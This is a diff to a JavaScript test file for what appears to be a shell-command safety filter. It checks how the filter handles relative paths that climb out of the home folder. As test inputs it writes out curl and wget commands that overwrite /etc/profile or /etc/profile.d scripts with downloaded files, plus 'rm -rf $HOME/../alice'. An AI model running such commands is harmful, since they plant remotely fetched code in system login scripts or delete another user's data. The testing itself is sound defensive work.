@@ -41,7 +41,10 @@ test('the home folder and an unknown folder keep the current answers', () => {
   assert.equal(rule('cd $DIR && curl -o ../etc/profile https://example.com/x'), 'allow');
 });
 
-test('a target that climbs above the home folder keeps resolving from /home', () => {
+test('a target that climbs above the home folder is read from the root, whatever the depth of the real home', () => {
+  // A home of /root climbs to / in one step, /home/<user> in two: the engine does not know which, so it assumes the shorter one.
+  assert.equal(rule('cd ~ && curl -o ../etc/profile https://example.com/x'), 'rc_download');
+  assert.equal(rule('cd $HOME && wget -O ../etc/profile.d/x.sh https://example.com/x'), 'rc_download');
   assert.equal(rule('cd ~ && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
   assert.equal(rule('cd ~ && wget -O ../../etc/profile.d/x.sh https://example.com/x'), 'rc_download');
   assert.equal(rule('cd $HOME && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
@@ -49,6 +52,11 @@ test('a target that climbs above the home folder keeps resolving from /home', ()
   // Stays inside the home folder, or lands beside it at /home level where nothing is protected: allowed.
   assert.equal(rule('cd ~/app && curl -o ../data/x.bin https://example.com/x'), 'allow');
   assert.equal(rule('cd ~ && curl -o ../other/x.bin https://example.com/x'), 'allow');
+  // A real home of /home/u: ../../etc/profile is blocked and ../other/x.bin is allowed; a real home of /root: ../etc/profile is blocked.
+  assert.equal(rule('cd /home/u && curl -o ../../etc/profile https://example.com/x'), 'rc_download');
+  assert.equal(rule('cd /home/u && curl -o ../other/x.bin https://example.com/x'), 'allow');
+  assert.equal(rule('cd /root && curl -o ../etc/profile https://example.com/x'), 'rc_download');
+  assert.equal(rule('rm -rf $HOME/../alice'), 'rm_root_home');
 });
 
 test('without a cd a relative target is read as before', () => {
